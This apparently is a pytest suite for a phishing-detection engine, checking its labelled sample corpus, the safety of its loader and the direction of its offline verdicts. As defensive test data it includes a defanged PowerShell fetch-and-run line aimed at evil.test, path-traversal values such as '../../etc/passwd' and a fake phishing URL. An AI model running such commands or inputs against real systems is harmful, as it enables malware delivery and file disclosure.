"""Tests for the labelled sample corpus (``examples/corpus``) and its loader.

Three groups: structure (every item has a label, files exist, nothing orphaned), safety
(only reserved hosts, no executable content, the loader refuses unsafe manifests) and an
offline smoke run of the real engine, checking the *direction* of the verdict
(malicious -> not benign, benign -> benign) on every non-``hard`` item. ``hard`` items are
kept in the corpus on purpose (they are misses and false-positive traps for the offline
detector), so they are only counted, never asserted item-by-item.
"""

from __future__ import annotations

import importlib.util
import re
import shutil
from collections import Counter
from pathlib import Path
from urllib.parse import urlsplit

import pytest

from uniphish.core.analyzer import AnalysisOptions
from uniphish.core.engine import Engine
from uniphish.core.types import Artifact, ArtifactKind, Level
from uniphish.eval import corpus as C
from uniphish.eval.datasets import ArtifactSpec, EvalItem

ROOT = C.corpus_dir()
BUILD_PY = ROOT / "_build" / "build.py"

RESERVED_SUFFIXES = (".test", ".example", ".invalid", ".localhost")
RESERVED_EXACT = {"example.com", "example.org", "example.net"}
# Real platforms that a phishing sample must reference to demonstrate the technique
# (open redirector, free hosting, IPFS gateway, shortener, freemail). Only fictional
# labels / paths / local parts are used on them.
REAL_PLATFORMS = {"google.com", "pages.dev", "ipfs.io", "bit.ly", "gmail.com"}
# Hosts that appear only as inert text: the visible anchor text of a mismatched link
# (never an href) and the XML namespace URI every SVG declares.
DISPLAY_ONLY = {"www.microsoft.com", "www.w3.org"}
URL_RE = re.compile(r"(?i)\b(?:https?|hxxps?)://([^\s/\"'<>?#]+)")


def _host(netloc: str) -> str:
    host = netloc.rsplit("@", 1)[-1]
    host = host.split(":", 1)[0] if not host.startswith("[") else host
    return (
        host.strip("[]").rstrip(".").lower().encode("ascii", "ignore").decode()
        if host.isascii()
        else host.rstrip(".").lower().encode("idna").decode()
    )


def _is_reserved(host: str) -> bool:
    return (
        host in RESERVED_EXACT
        or host.endswith(RESERVED_SUFFIXES)
        or any(host.endswith("." + d) for d in RESERVED_EXACT)
    )


def _hosts_in(item: C.CorpusItem) -> set[str]:
    p = item.payload
    text = p if isinstance(p, str) else p.decode("utf-8", "replace")
    hosts = {_host(m) for m in URL_RE.findall(text)}
    if item.kind == "url":
        hosts = {_host(urlsplit(text).netloc)}
    return {h for h in hosts if h and not re.fullmatch(r"[\d.]+", h)}


@pytest.fixture(scope="module")
def items() -> list[C.CorpusItem]:
    return C.load_items()


# --------------------------------------------------------------------------- #
# structure
# --------------------------------------------------------------------------- #
class TestStructure:
    def test_corpus_loads_and_validates(self, items):
        assert items
        assert C.validate_corpus() == []

    def test_every_item_is_labelled_and_unique(self, items):
        assert len({i.id for i in items}) == len(items)
        for i in items:
            assert i.label in C.LABELS, i.id
            assert i.kind in C.KINDS, i.id
            assert i.category and i.id.split("-", 1)[0] in {"url", "txt", "eml", "page", "file"}, (
                i.id
            )

    def test_referenced_files_exist_and_are_nonempty(self, items):
        for i in items:
            if i.kind in ("email", "page", "file"):
                assert i.path and (ROOT / i.path).is_file(), i.id
                assert len(i.payload) > 0, i.id
            assert i.payload, i.id

    def test_counts_per_category_are_reported(self, items, capsys):
        c = C.counts(items)
        with capsys.disabled():
            print(f"\ncorpus: {c['total']} items, {c['hard']} hard")
            for kind in C.KINDS:
                kl = c["by_kind_label"][kind]
                print(
                    f"  {kind:<6} {c['by_kind'][kind]:>3} "
                    f"(malicious {kl['malicious']}, benign {kl['benign']})"
                )
            print("  categories:", ", ".join(f"{k}={v}" for k, v in c["by_category"].items()))
        assert c["total"] == len(items) == sum(c["by_kind"].values()) == sum(c["by_label"].values())
        # Every vector has both classes; the spec's named samples are all present.
        for kind in C.KINDS:
            kl = c["by_kind_label"][kind]
            assert kl["malicious"] >= 1 and kl["benign"] >= 1, kind
        assert c["by_kind"]["url"] >= 40 and c["by_kind"]["text"] >= 30
        assert c["by_kind"]["email"] >= 6 and c["by_kind"]["page"] >= 4
        assert c["by_kind"]["file"] >= 5
        cats = set(c["by_category"])
        assert {
            "spoofed_brand",
            "auth_failure",
            "bec",
            "legit_authenticated",
            "forwarded_phish",
        } <= cats
        assert {"credential_form", "clickfix", "brand_mismatch", "legit_login"} <= cats
        assert {"double_extension", "svg_phishing", "quishing", "html_smuggling"} <= cats

    def test_text_corpus_is_multilingual_and_has_injection(self, items):
        langs = {i.lang for i in items if i.kind == "text"}
        assert {"en", "es", "de", "fr", "hi", "ru", "zh", "ar", "ja"} <= langs
        assert any(i.category.startswith("injection") for i in items if i.kind == "text")
        scripts = {i.script for i in items if i.kind == "url"}
        assert {"Latn", "Cyrl", "Grek", "Arab", "Hani", "Deva", "Hang"} <= scripts

    def test_filters(self):
        urls = C.load_items(kinds=["url"])
        assert urls and {i.kind for i in urls} == {"url"}
        ben = C.load_items(labels="benign", kinds="text")
        assert ben and {i.label for i in ben} == {"benign"}
        easy = C.load_items(include_hard=False)
        assert all(not i.hard for i in easy) and len(easy) < len(C.load_items())
        assert C.load_items(categories=["clickfix"])[0].kind == "page"
        with pytest.raises(C.CorpusError):
            C.load_items(kinds=["nope"])

    def test_load_corpus_tuples(self):
        rows = list(C.load_corpus(kinds=["email"]))
        assert rows
        for kind, payload, label, meta in rows:
            assert kind == "email" and isinstance(payload, bytes)
            assert label in C.LABELS and meta["id"].startswith("eml-")

    def test_build_script_is_current(self):
        """Text files match what build.py would write (PNG-derived bytes are checked by
        decoding instead, since encoder output can vary between OpenCV versions)."""
        spec = importlib.util.spec_from_file_location("corpus_build", BUILD_PY)
        mod = importlib.util.module_from_spec(spec)
        assert spec.loader is not None
        spec.loader.exec_module(mod)
        stale = [
            rel
            for rel, data in mod.render().items()
            if not rel.endswith(".png")
            and "quishing" not in rel
            and rel != "manifest.yaml"
            and (ROOT / rel).read_bytes() != data
        ]
        assert stale == []
        assert (ROOT / "manifest.yaml").read_bytes() == mod.render()["manifest.yaml"]


# --------------------------------------------------------------------------- #
# safety
# --------------------------------------------------------------------------- #
class TestInertness:
    def test_hosts_are_reserved_or_documented_platforms(self, items):
        offenders: list[str] = []
        for i in items:
            if i.kind == "file" and isinstance(i.payload, bytes) and i.payload[:4] == b"\x89PNG":
                continue
            for h in _hosts_in(i):
                if (
                    i.is_malicious
                    and not _is_reserved(h)
                    and h not in DISPLAY_ONLY
                    and not any(h == d or h.endswith("." + d) for d in REAL_PLATFORMS)
                ):
                    offenders.append(f"{i.id}: {h}")
        assert offenders == []

    def test_phishing_urls_carry_no_real_brand_hosts_as_target(self, items):
        # a malicious URL's effective host must never be a real, registrable brand site
        for i in items:
            if i.kind == "url" and i.is_malicious:
                h = _host(urlsplit(i.payload).netloc)
                assert (
                    _is_reserved(h)
                    or h in {"ipfs.io", "bit.ly", "www.google.com"}
                    or h.endswith(".pages.dev")
                    or re.fullmatch(r"[\d.]+", h)
                ), i.id

    def test_no_executable_or_archive_magic(self, items):
        bad = (
            b"MZ",
            b"\x7fELF",
            b"\xcf\xfa\xed\xfe",
            b"\xca\xfe\xba\xbe",
            b"PK\x03\x04",
            b"%PDF",
            b"\xd0\xcf\x11\xe0",
            b"Rar!",
            b"7z\xbc\xaf",
        )
        for i in items:
            if i.kind in ("file", "email") and isinstance(i.payload, bytes):
                assert not i.payload.startswith(bad), i.id

    def test_pages_and_files_are_defanged(self, items):
        for i in items:
            if i.kind == "page":
                txt = str(i.payload)
                assert "hxxp://evil.test" in txt or "evil.test" not in txt
                assert not re.search(
                    r"(?i)\bhttps?://(?!(?:[a-z0-9.-]+\.)?"
                    r"(?:test|example|invalid)\b|www\.example\.com)",
                    txt,
                ), i.id

    def test_clickfix_command_is_the_inert_placeholder(self, items):
        page = next(i for i in items if i.id == "page-clickfix")
        assert "iwr hxxp://evil.test/a.ps1" in str(page.payload)
        assert "http://evil" not in str(page.payload)


class TestLoaderSecurity:
    @pytest.fixture
    def tmp_root(self, tmp_path):
        root = tmp_path / "corpus"
        shutil.copytree(ROOT, root, ignore=shutil.ignore_patterns("_build", "__pycache__"))
        return root

    @staticmethod
    def _rewrite(root: Path, old: str, new: str, count: int = 1) -> None:
        mp = root / "manifest.yaml"
        text = mp.read_text(encoding="utf-8")
        assert old in text
        mp.write_text(text.replace(old, new, count), encoding="utf-8")

    def test_copy_is_valid(self, tmp_root):
        assert C.validate_corpus(tmp_root) == []

    def test_rejects_path_traversal(self, tmp_root):
        self._rewrite(tmp_root, 'path: "emails/aligned_legit.eml"', 'path: "../../etc/passwd"')
        with pytest.raises(C.CorpusError, match="relative"):
            C.load_items(root=tmp_root)

    def test_rejects_absolute_path(self, tmp_root):
        self._rewrite(tmp_root, 'path: "emails/aligned_legit.eml"', 'path: "/etc/hosts"')
        with pytest.raises(C.CorpusError):
            C.load_items(root=tmp_root)

    def test_rejects_symlink_escape(self, tmp_root, tmp_path):
        outside = tmp_path / "secret.txt"
        outside.write_text("top secret", encoding="utf-8")
        link = tmp_root / "files" / "benign_note.txt"
        link.unlink()
        try:
            link.symlink_to(outside)
        except OSError:  # pragma: no cover - platforms without symlinks
            pytest.skip("symlinks unavailable")
        with pytest.raises(C.CorpusError, match="escapes"):
            C.load_items(root=tmp_root)

    def test_rejects_arbitrary_jsonl_source(self, tmp_root):
        self._rewrite(tmp_root, 'source: "urls.jsonl"', 'source: "manifest.yaml"')
        with pytest.raises(C.CorpusError, match="source must be"):
            C.load_items(root=tmp_root)

    def test_rejects_bad_label_kind_and_duplicates(self, tmp_root):
        self._rewrite(tmp_root, 'label: "benign"', 'label: "maybe"')
        with pytest.raises(C.CorpusError, match="label"):
            C.load_manifest(tmp_root)

    def test_rejects_unknown_kind(self, tmp_root):
        self._rewrite(tmp_root, 'kind: "page"', 'kind: "video"')
        with pytest.raises(C.CorpusError, match="kind"):
            C.load_manifest(tmp_root)

    def test_rejects_duplicate_ids(self, tmp_root):
        self._rewrite(tmp_root, 'id: "url-bitflip"', 'id: "url-ip-host"')
        with pytest.raises(C.CorpusError, match="duplicate"):
            C.load_manifest(tmp_root)

    def test_missing_file_and_missing_manifest(self, tmp_root, tmp_path):
        (tmp_root / "pages" / "benign_blog.html").unlink()
        with pytest.raises(C.CorpusError, match="missing"):
            C.load_items(root=tmp_root)
        empty = tmp_path / "empty"
        empty.mkdir()
        with pytest.raises(C.CorpusError, match="manifest"):
            C.load_items(root=empty)
        with pytest.raises(C.CorpusError, match="not found"):
            C.corpus_dir(tmp_path / "does-not-exist")

    def test_oversize_file_is_refused(self, tmp_root, monkeypatch):
        monkeypatch.setattr(C, "_MAX_ITEM_BYTES", 10)
        with pytest.raises(C.CorpusError, match="cap"):
            C.load_items(kinds=["page"], root=tmp_root)

    def test_malformed_yaml_and_jsonl(self, tmp_root):
        (tmp_root / "urls.jsonl").write_text("{not json\n", encoding="utf-8")
        with pytest.raises(C.CorpusError, match="invalid JSON"):
            C.load_items(kinds=["url"], root=tmp_root)
        (tmp_root / "manifest.yaml").write_text("items: [unclosed\n", encoding="utf-8")
        with pytest.raises(C.CorpusError, match="YAML"):
            C.load_manifest(tmp_root)

    def test_validate_reports_orphans(self, tmp_root):
        (tmp_root / "pages" / "stray.html").write_text("<p>x</p>", encoding="utf-8")
        assert any("orphan" in p for p in C.validate_corpus(tmp_root))

    def test_env_override(self, tmp_root, monkeypatch):
        monkeypatch.setenv(C.CORPUS_ENV, str(tmp_root))
        assert C.corpus_dir() == tmp_root.resolve()


# --------------------------------------------------------------------------- #
# conversion to engine / eval inputs
# --------------------------------------------------------------------------- #
class TestConversion:
    def test_every_item_builds_an_artifact_of_the_right_kind(self, items):
        want = {
            "url": ArtifactKind.URL,
            "text": ArtifactKind.TEXT,
            "email": ArtifactKind.EMAIL,
            "page": ArtifactKind.PAGE,
            "file": ArtifactKind.FILE,
        }
        for i in items:
            a = i.to_artifact()
            assert isinstance(a, Artifact) and a.kind is want[i.kind], i.id
        page = next(i for i in items if i.kind == "page").to_artifact()
        assert page.url and page.content
        f = next(i for i in items if i.id == "file-double-extension").to_artifact()
        assert f.filename == "Invoice_2026-114.pdf.exe"

    def test_rtlo_filename_is_preserved(self, items):
        f = next(i for i in items if i.id == "file-rtlo-name")
        assert "‮" in (f.filename or "")

    def test_eval_harness_interop(self, items):
        for i in items:
            if i.kind == "file":
                with pytest.raises(C.CorpusError):
                    i.to_spec()
                continue
            spec = i.to_spec()
            assert isinstance(spec, ArtifactSpec) and spec.kind == i.kind
            spec.to_artifact()
            ev = i.to_eval_item()
            assert isinstance(ev, EvalItem)
            assert ev.label == (1 if i.is_malicious else 0) and ev.dataset == "corpus"
        h = next(i for i in items if i.hard and i.kind != "file")
        assert "hard" in h.to_eval_item().tags

    def test_qr_images_decode_to_the_documented_urls(self, items):
        from uniphish.files import qr_available, qr_payload_urls

        if not qr_available():
            pytest.skip("OpenCV not available")
        phish = next(i for i in items if i.id == "file-qr-phish")
        benign = next(i for i in items if i.id == "file-benign-qr")
        assert qr_payload_urls(phish.payload) == ["https://secure-paypa1-verify.test/login?ref=qr"]
        assert qr_payload_urls(benign.payload) == ["https://www.example.com/menu"]
        quish = next(i for i in items if i.id == "eml-quishing")
        assert b"mfa-enrol.png" in quish.payload


# --------------------------------------------------------------------------- #
# engine smoke run (offline, real engine)
# --------------------------------------------------------------------------- #
@pytest.fixture(scope="module")
def verdicts(items):
    """Run the real engine offline over every item once (shared by the tests below)."""
    eng = Engine()
    opts = AnalysisOptions(online=False, analyzer_timeout_s=120.0, timeout_s=300.0)
    eng.analyze_sync(Artifact.from_text("warm-up"), opts)  # cold-start (model, KB) cost
    for kind in ("email", "page"):  # warm the heavier analyzers off the clock too
        probe = next(i for i in items if i.kind == kind)
        eng.analyze_sync(probe.to_artifact(), opts)
    return {i.id: eng.analyze_sync(i.to_artifact(), opts) for i in items}


def _directional_ok(item: C.CorpusItem, level: Level) -> bool:
    return (level is not Level.BENIGN) == item.is_malicious


class TestEngineSmoke:
    @pytest.mark.parametrize("kind", C.KINDS)
    def test_direction_on_non_hard_items(self, items, verdicts, kind):
        wrong = [
            f"{i.id}: {verdicts[i.id].level.value} ({verdicts[i.id].score})"
            for i in items
            if i.kind == kind and not i.hard and not _directional_ok(i, verdicts[i.id].level)
        ]
        assert wrong == [], f"engine disagrees with the label on non-hard {kind} items"

    def test_headline_signals_fire_on_non_hard_items(self, items, verdicts):
        missing = []
        for i in items:
            if i.hard or not i.headline_signal:
                continue
            ids = {s.id for s in verdicts[i.id].signals}
            if i.headline_signal not in ids:
                missing.append(f"{i.id}: wanted {i.headline_signal}, got {sorted(ids)[:6]}")
        assert missing == []

    def test_expected_techniques_on_non_hard_items(self, items, verdicts):
        missing = []
        for i in items:
            if i.hard or not i.expected_techniques:
                continue
            got = set(verdicts[i.id].techniques)
            if not set(i.expected_techniques) <= got:
                missing.append(f"{i.id}: {sorted(set(i.expected_techniques) - got)}")
        assert missing == []

    def test_benign_items_stay_below_the_malicious_threshold(self, items, verdicts):
        bad = [
            i.id
            for i in items
            if not i.is_malicious and not i.hard and verdicts[i.id].level is Level.MALICIOUS
        ]
        assert bad == []

    def test_forwarded_phish_surfaces_the_attached_message(self, verdicts):
        v = verdicts["eml-forwarded-phish"]
        assert v.level is Level.MALICIOUS
        assert any(c.kind is ArtifactKind.EMAIL and c.level is Level.MALICIOUS for c in v.children)

    def test_quishing_email_flags_through_its_qr_image(self, verdicts):
        v = verdicts["eml-quishing"]
        assert v.level is not Level.BENIGN
        assert any(c.kind is ArtifactKind.FILE and c.level is not Level.BENIGN for c in v.children)

    def test_overall_agreement_including_hard_items_is_reported(self, items, verdicts, capsys):
        """Honest aggregate: counts hard items too, so the number is not flattering."""
        tally: Counter[str] = Counter()
        for i in items:
            ok = _directional_ok(i, verdicts[i.id].level)
            tally[
                "hard_ok"
                if i.hard and ok
                else "hard_miss"
                if i.hard
                else "easy_ok"
                if ok
                else "easy_miss"
            ] += 1
        total_ok = tally["hard_ok"] + tally["easy_ok"]
        acc = total_ok / len(items)
        with capsys.disabled():
            print(
                f"\ncorpus engine agreement: {total_ok}/{len(items)} = {acc:.1%} "
                f"(non-hard {tally['easy_ok']}/{tally['easy_ok'] + tally['easy_miss']}, "
                f"hard {tally['hard_ok']}/{tally['hard_ok'] + tally['hard_miss']})"
            )
        assert tally["easy_miss"] == 0
        assert acc >= 0.80  # regression floor, deliberately below the measured value
